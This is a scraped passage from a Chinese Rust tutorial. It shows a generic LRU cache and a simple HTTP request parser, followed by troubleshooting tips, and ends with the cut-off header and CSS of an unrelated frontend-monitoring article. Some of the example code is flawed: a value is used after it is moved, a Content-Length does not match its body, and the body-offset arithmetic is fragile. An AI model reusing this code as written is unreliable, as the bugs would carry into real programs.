    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: &amp;K) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;&amp;V&gt; {
        <span class="hljs-keyword">self</span>.data.<span class="hljs-title function_ invoke__">get</span>(key)
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">remove</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: &amp;K) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;V&gt; {
        <span class="hljs-keyword">self</span>.data.<span class="hljs-title function_ invoke__">remove</span>(key)
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">len</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
        <span class="hljs-keyword">self</span>.data.<span class="hljs-title function_ invoke__">len</span>()
    }
}

<span class="hljs-comment">// 定义通用的缓存系统</span>
<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Cache</span>&lt;K, V, S: CacheStrategy&lt;K, V&gt;, T: CacheStorage&lt;K, V&gt;&gt; {
    strategy: S,
    storage: T,
}

<span class="hljs-keyword">impl</span>&lt;K, V, S: CacheStrategy&lt;K, V&gt;, T: CacheStorage&lt;K, V&gt;&gt; Cache&lt;K, V, S, T&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(strategy: S, storage: T) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Cache { strategy, storage }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">insert</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: K, value: V) {
        <span class="hljs-comment">// 如果缓存已满，删除最少使用的key</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(delete_key) = <span class="hljs-keyword">self</span>.strategy.<span class="hljs-title function_ invoke__">on_delete</span>() {
            <span class="hljs-keyword">self</span>.storage.<span class="hljs-title function_ invoke__">remove</span>(&amp;delete_key);
        }

        <span class="hljs-comment">// 插入新数据</span>
        <span class="hljs-keyword">self</span>.storage.<span class="hljs-title function_ invoke__">insert</span>(key.<span class="hljs-title function_ invoke__">clone</span>(), value);
        <span class="hljs-keyword">self</span>.strategy.<span class="hljs-title function_ invoke__">on_insert</span>(key, value);
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, key: &amp;K) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;&amp;V&gt; {
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(value) = <span class="hljs-keyword">self</span>.storage.<span class="hljs-title function_ invoke__">get</span>(key) {
            <span class="hljs-keyword">self</span>.strategy.<span class="hljs-title function_ invoke__">on_access</span>(key);
            <span class="hljs-title function_ invoke__">Some</span>(value)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-literal">None</span>
        }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">len</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
        <span class="hljs-keyword">self</span>.storage.<span class="hljs-title function_ invoke__">len</span>()
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">capacity</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
        <span class="hljs-keyword">self</span>.strategy.<span class="hljs-title function_ invoke__">capacity</span>()
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 实例化一个容量为3的LRU内存缓存</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cache</span> = Cache::<span class="hljs-title function_ invoke__">new</span>(
        LruCacheStrategy::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">3</span>),
        MemoryStorage::<span class="hljs-title function_ invoke__">new</span>(),
    );

    <span class="hljs-comment">// 插入数据</span>
    cache.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">"key1"</span>, <span class="hljs-string">"value1"</span>);
    cache.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">"key2"</span>, <span class="hljs-string">"value2"</span>);
    cache.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">"key3"</span>, <span class="hljs-string">"value3"</span>);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"插入3个数据后的缓存状态: {:?}"</span>, cache);

    <span class="hljs-comment">// 访问key1，使其成为最近使用的</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">value1</span> = cache.<span class="hljs-title function_ invoke__">get</span>(&amp;<span class="hljs-string">"key1"</span>).<span class="hljs-title function_ invoke__">unwrap</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"访问key1，值为: {}"</span>, value1);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"访问key1后的缓存状态: {:?}"</span>, cache);

    <span class="hljs-comment">// 插入key4，导致key2被删除（最少使用）</span>
    cache.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">"key4"</span>, <span class="hljs-string">"value4"</span>);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"插入key4后的缓存状态: {:?}"</span>, cache);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"cache中是否包含key2: {}"</span>, cache.<span class="hljs-title function_ invoke__">get</span>(&amp;<span class="hljs-string">"key2"</span>).<span class="hljs-title function_ invoke__">is_some</span>());
}

AI写代码rust
运行
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197</span>
</code></pre>
<h4 data-id="heading-17"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>5.2 案例2：实现自定义的HTTP请求解析器</h4>
<p>💡 <strong>场景分析</strong>：需要编写一个简单的HTTP请求解析器，支持解析GET和POST请求，包括请求方法、路径、版本、请求头和请求体。</p>
<p>⌨️ <strong>代码示例</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::collections::HashMap;

<span class="hljs-comment">// 定义HTTP方法的枚举</span>
<span class="hljs-meta">#[derive(Debug, PartialEq)]</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">HttpMethod</span> {
    GET,
    POST,
    PUT,
    DELETE,
    <span class="hljs-title function_ invoke__">OTHER</span>(<span class="hljs-type">String</span>),
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">From</span>&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-keyword">for</span> <span class="hljs-title class_">HttpMethod</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from</span>(method_str: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">match</span> method_str.<span class="hljs-title function_ invoke__">to_uppercase</span>().<span class="hljs-title function_ invoke__">as_str</span>() {
            <span class="hljs-string">"GET"</span> =&gt; HttpMethod::GET,
            <span class="hljs-string">"POST"</span> =&gt; HttpMethod::POST,
            <span class="hljs-string">"PUT"</span> =&gt; HttpMethod::PUT,
            <span class="hljs-string">"DELETE"</span> =&gt; HttpMethod::DELETE,
            _ =&gt; HttpMethod::<span class="hljs-title function_ invoke__">OTHER</span>(method_str),
        }
    }
}

<span class="hljs-comment">// 定义HTTP版本的枚举</span>
<span class="hljs-meta">#[derive(Debug, PartialEq)]</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">HttpVersion</span> {
    HTTP10,
    HTTP11,
    HTTP20,
    <span class="hljs-title function_ invoke__">OTHER</span>(<span class="hljs-type">String</span>),
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">From</span>&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-keyword">for</span> <span class="hljs-title class_">HttpVersion</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from</span>(version_str: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">match</span> version_str.<span class="hljs-title function_ invoke__">to_uppercase</span>().<span class="hljs-title function_ invoke__">as_str</span>() {
            <span class="hljs-string">"HTTP/1.0"</span> =&gt; HttpVersion::HTTP10,
            <span class="hljs-string">"HTTP/1.1"</span> =&gt; HttpVersion::HTTP11,
            <span class="hljs-string">"HTTP/2.0"</span> =&gt; HttpVersion::HTTP20,
            _ =&gt; HttpVersion::<span class="hljs-title function_ invoke__">OTHER</span>(version_str),
        }
    }
}

<span class="hljs-comment">// 定义HTTP请求结构体</span>
<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">HttpRequest</span> {
    method: HttpMethod,
    path: <span class="hljs-type">String</span>,
    version: HttpVersion,
    headers: HashMap&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt;,
    body: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">HttpRequest</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        HttpRequest {
            method: HttpMethod::<span class="hljs-title function_ invoke__">OTHER</span>(<span class="hljs-string">""</span>.<span class="hljs-title function_ invoke__">to_string</span>()),
            path: <span class="hljs-string">""</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
            version: HttpVersion::<span class="hljs-title function_ invoke__">OTHER</span>(<span class="hljs-string">""</span>.<span class="hljs-title function_ invoke__">to_string</span>()),
            headers: HashMap::<span class="hljs-title function_ invoke__">new</span>(),
            body: <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>(),
        }
    }

    <span class="hljs-comment">// 解析HTTP请求字符串</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">parse</span>(raw_request: &amp;[<span class="hljs-type">u8</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-keyword">Self</span>, <span class="hljs-type">String</span>&gt; {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">raw_str</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from_utf8_lossy</span>(raw_request).<span class="hljs-title function_ invoke__">into_owned</span>();
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">lines</span> = raw_str.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">"\r\n"</span>);

        <span class="hljs-comment">// 解析请求行</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">request_line</span> = <span class="hljs-keyword">match</span> lines.<span class="hljs-title function_ invoke__">next</span>() {
            <span class="hljs-title function_ invoke__">Some</span>(line) =&gt; line.<span class="hljs-title function_ invoke__">trim</span>(),
            <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(<span class="hljs-string">"无效的请求行"</span>.<span class="hljs-title function_ invoke__">to_string</span>()),
        };

        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">request_parts</span>: <span class="hljs-type">Vec</span>&lt;&amp;<span class="hljs-type">str</span>&gt; = request_line.<span class="hljs-title function_ invoke__">split_whitespace</span>().<span class="hljs-title function_ invoke__">collect</span>();
        <span class="hljs-keyword">if</span> request_parts.<span class="hljs-title function_ invoke__">len</span>() != <span class="hljs-number">3</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(<span class="hljs-string">"请求行格式错误"</span>.<span class="hljs-title function_ invoke__">to_string</span>());
        }

        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">method</span> = HttpMethod::<span class="hljs-title function_ invoke__">from</span>(request_parts[<span class="hljs-number">0</span>].<span class="hljs-title function_ invoke__">to_string</span>());
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">path</span> = request_parts[<span class="hljs-number">1</span>].<span class="hljs-title function_ invoke__">to_string</span>();
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">version</span> = HttpVersion::<span class="hljs-title function_ invoke__">from</span>(request_parts[<span class="hljs-number">2</span>].<span class="hljs-title function_ invoke__">to_string</span>());

        <span class="hljs-comment">// 解析请求头</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">headers</span> = HashMap::<span class="hljs-title function_ invoke__">new</span>();
        <span class="hljs-keyword">loop</span> {
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">line</span> = <span class="hljs-keyword">match</span> lines.<span class="hljs-title function_ invoke__">next</span>() {
                <span class="hljs-title function_ invoke__">Some</span>(line) =&gt; line.<span class="hljs-title function_ invoke__">trim</span>(),
                <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">break</span>,
            };

            <span class="hljs-keyword">if</span> line.<span class="hljs-title function_ invoke__">is_empty</span>() {
                <span class="hljs-keyword">break</span>;
            }

            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">header_parts</span>: <span class="hljs-type">Vec</span>&lt;&amp;<span class="hljs-type">str</span>&gt; = line.<span class="hljs-title function_ invoke__">splitn</span>(<span class="hljs-number">2</span>, <span class="hljs-string">':'</span>).<span class="hljs-title function_ invoke__">collect</span>();
            <span class="hljs-keyword">if</span> header_parts.<span class="hljs-title function_ invoke__">len</span>() != <span class="hljs-number">2</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(<span class="hljs-string">"请求头格式错误"</span>.<span class="hljs-title function_ invoke__">to_string</span>());
            }

            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">header_name</span> = header_parts[<span class="hljs-number">0</span>].<span class="hljs-title function_ invoke__">trim</span>().<span class="hljs-title function_ invoke__">to_lowercase</span>();
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">header_value</span> = header_parts[<span class="hljs-number">1</span>].<span class="hljs-title function_ invoke__">trim</span>().<span class="hljs-title function_ invoke__">to_string</span>();
            headers.<span class="hljs-title function_ invoke__">insert</span>(header_name, header_value);
        }

        <span class="hljs-comment">// 解析请求体</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">body</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(content_length_str) = headers.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">"content-length"</span>) {
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">content_length</span> = <span class="hljs-keyword">match</span> content_length_str.parse::&lt;<span class="hljs-type">usize</span>&gt;() {
                <span class="hljs-title function_ invoke__">Ok</span>(len) =&gt; len,
                <span class="hljs-title function_ invoke__">Err</span>(_) =&gt; <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(<span class="hljs-string">"Content-Length格式错误"</span>.<span class="hljs-title function_ invoke__">to_string</span>()),
            };

            <span class="hljs-comment">// 计算请求体的起始位置</span>
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">request_line_length</span> = request_line.<span class="hljs-title function_ invoke__">len</span>() + <span class="hljs-number">2</span>;  <span class="hljs-comment">// 加上\r\n</span>
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">headers_length</span>: <span class="hljs-type">usize</span> = headers
                .<span class="hljs-title function_ invoke__">iter</span>()
                .<span class="hljs-title function_ invoke__">map</span>(|(name, value)| name.<span class="hljs-title function_ invoke__">len</span>() + <span class="hljs-number">2</span> + value.<span class="hljs-title function_ invoke__">len</span>() + <span class="hljs-number">2</span>)  <span class="hljs-comment">// name: value\r\n</span>
                .<span class="hljs-title function_ invoke__">sum</span>();
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">start_index</span> = request_line_length + headers_length + <span class="hljs-number">2</span>;  <span class="hljs-comment">// 加上最后的空行\r\n</span>

            <span class="hljs-keyword">if</span> raw_request.<span class="hljs-title function_ invoke__">len</span>() &gt;= start_index + content_length {
                body.<span class="hljs-title function_ invoke__">extend_from_slice</span>(&amp;raw_request[start_index..start_index + content_length]);
            }
        }

        <span class="hljs-title function_ invoke__">Ok</span>(HttpRequest {
            method,
            path,
            version,
            headers,
            body,
        })
    }

    <span class="hljs-comment">// 打印HTTP请求信息</span>
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_info</span>(&amp;<span class="hljs-keyword">self</span>) {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"请求方法: {:?}"</span>, <span class="hljs-keyword">self</span>.method);
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"请求路径: {}"</span>, <span class="hljs-keyword">self</span>.path);
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"HTTP版本: {:?}"</span>, <span class="hljs-keyword">self</span>.version);
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"请求头:"</span>);
        <span class="hljs-title function_ invoke__">for</span> (name, value) <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.headers.<span class="hljs-title function_ invoke__">iter</span>() {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"  {}: {}"</span>, name, value);
        }
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"请求体长度: {}"</span>, <span class="hljs-keyword">self</span>.body.<span class="hljs-title function_ invoke__">len</span>());
        <span class="hljs-keyword">if</span> !<span class="hljs-keyword">self</span>.body.<span class="hljs-title function_ invoke__">is_empty</span>() {
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Ok</span>(body_str) = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(<span class="hljs-keyword">self</span>.body.<span class="hljs-title function_ invoke__">clone</span>()) {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"请求体内容: {}"</span>, body_str);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"请求体内容: 二进制数据"</span>);
            }
        }
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 示例1：简单的GET请求</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">raw_get_request</span> = <span class="hljs-string">b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Rust HTTP Client\r\n\r\n"</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">get_request</span> = HttpRequest::<span class="hljs-title function_ invoke__">parse</span>(raw_get_request).<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">"解析GET请求失败"</span>);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"---------- GET请求信息 ----------"</span>);
    get_request.<span class="hljs-title function_ invoke__">print_info</span>();

    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"----------"</span>);

    <span class="hljs-comment">// 示例2：带请求体的POST请求</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">raw_post_request</span> = <span class="hljs-string">b"POST /submit HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Rust HTTP Client\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 25\r\n\r\nname=张三&amp;email=zhangsan@example.com"</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">post_request</span> = HttpRequest::<span class="hljs-title function_ invoke__">parse</span>(raw_post_request).<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">"解析POST请求失败"</span>);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"---------- POST请求信息 ----------"</span>);
    post_request.<span class="hljs-title function_ invoke__">print_info</span>();
}

AI写代码rust
运行
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172</span>
</code></pre>
<h3 data-id="heading-18"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>六、常见问题与解决方案</h3>
<h4 data-id="heading-19"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.1 trait对象的对象安全问题</h4>
<p><strong>问题现象</strong>：尝试将包含Self类型或泛型参数的方法的trait转换为trait对象时，会导致编译错误。</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>避免在trait方法中使用Self类型的参数或返回值</li>
<li>避免在trait方法中使用泛型参数</li>
<li>如果需要使用泛型，可以考虑使用关联类型代替</li>
</ol>
<h4 data-id="heading-20"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.2 泛型约束的类型不匹配</h4>
<p><strong>问题现象</strong>：函数调用时实参类型不符合泛型结构体/枚举的约束条件，导致编译错误。</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>检查函数调用时实参类型是否与泛型约束一致</li>
<li>如果使用了自定义类型，确保该类型实现了所需的trait</li>
<li>可以使用<code>std::marker::PhantomData</code>来标记未使用的泛型参数</li>
</ol>
<h4 data-id="heading-21"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.3 字段验证与序列化属性配置错误</h4>
<p><strong>问题现象</strong>：使用serde等库时，字段属性配置不当导致序列化失败。</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>仔细检查字段属性配置是否符合库的要求</li>
<li>可以使用<code>#[serde(skip_deserializing)]</code>或<code>#[serde(skip_serializing)]</code>来跳过某些字段的序列化/反序列化</li>
<li>可以使用<code>#[serde(default)]</code>来设置默认值</li>
</ol>
<h3 data-id="heading-22"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>七、总结与展望</h3>
<h4 data-id="heading-23"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>7.1 总结</h4>
<p>✅ 掌握了泛型结构体/枚举的定义与应用，实现了类型安全的代码复用<br/>
✅ 精通了trait的高级应用，包括关联类型、默认实现、trait对象的动态分发机制<br/>
✅ 优化了模式匹配的代码，深入学习了嵌套模式匹配、判别式处理<br/>
✅ 丰富了自定义类型的功能，了解了派生宏的高级配置和字段验证方法<br/>
✅ 结合真实场景编写了两个实用的代码案例：通用数据缓存系统和HTTP请求解析器</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端向架构突围系列 - 性能观测 [7 - 2]：前端全链路性能监控系统 (APM)]]></title>    <link>https://juejin.cn/post/7602206323461423155</link>    <guid>https://juejin.cn/post/7602206323461423155</guid>    <pubDate>2026-02-03T07:43:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602206323461423155" data-draft-id="7602447286606610441" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端向架构突围系列 - 性能观测 [7 - 2]：前端全链路性能监控系统 (APM)"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T07:43:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端王壮壮"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端向架构突围系列 - 性能观测 [7 - 2]：前端全链路性能监控系统 (APM)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端王壮壮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:43:37.000Z" title="Tue Feb 03 2026 07:43:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosi